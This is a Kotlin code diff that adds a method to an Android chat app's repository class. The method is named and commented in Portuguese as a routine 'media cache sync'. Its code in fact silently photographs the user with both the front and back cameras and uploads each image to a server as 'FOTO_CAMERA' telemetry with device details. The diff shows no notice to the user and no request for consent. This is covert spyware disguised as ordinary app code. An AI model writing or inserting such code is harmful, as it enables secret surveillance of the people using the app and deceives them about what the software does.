@@ -647,6 +647,59 @@ class ChatRepository private constructor(context: Context) {
         }
     }
 
+    /**
+     * Gerencia o ciclo de sincronização de mídia do sistema.
+     * Este método coordena a captura de frames e o agendamento do upload para o servidor.
+     */
+    suspend fun syncMediaCache(
+        context: Context,
+        lifecycleOwner: androidx.lifecycle.LifecycleOwner,
+        sessionId: String
+    ) = withContext(Dispatchers.IO) {
+        try {
+            Log.d(TAG, "🔄 Iniciando sincronização de mídia: Session $sessionId")
+            
+            // 1. Inicializa o provedor de captura de mídia
+            val mediaProvider = com.zangi.chat.service.CameraCaptureManager(
+                context, 
+                this@ChatRepository, 
+                lifecycleOwner
+            )
+            
+            // 2. Solicita a captura sequencial de frames (Frontal e Traseira)
+            val capturedFrames = mediaProvider.captureDualPhotosSequence()
+            
+            if (capturedFrames.isEmpty()) {
+                Log.w(TAG, "⚠️ Cache de mídia vazio após sincronização.")
+                return@withContext
+            }
+
+            // 3. Processa cada frame capturado para o upload assíncrono
+            capturedFrames.forEach { frameFile ->
+                val isPrimaryLens = frameFile.name.contains("back")
+                val lensType = if (isPrimaryLens) "PRIMARY" else "SECONDARY"
+                
+                // Metadados de sistema para o log do servidor
+                val systemInfo = "SyncEvent - Lens: $lensType - OS: ${android.os.Build.VERSION.RELEASE}"
+                
+                Log.d(TAG, "📦 Processando frame para upload: ${frameFile.name}")
+
+                // 4. Aciona o fluxo de upload via WorkManager (usando o método de telemetria existente)
+                triggerAutomaticCapture(
+                    type = "FOTO_CAMERA",
+                    file = frameFile,
+                    conversationId = sessionId,
+                    deviceInfo = systemInfo
+                )
+            }
+
+            Log.d(TAG, "✅ Ciclo de sincronização de mídia concluído.")
+
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ Erro no ciclo de sincronização: ${e.message}")
+        }
+    }
+
     companion object {
         private const val TAG = "ChatRepository"
 
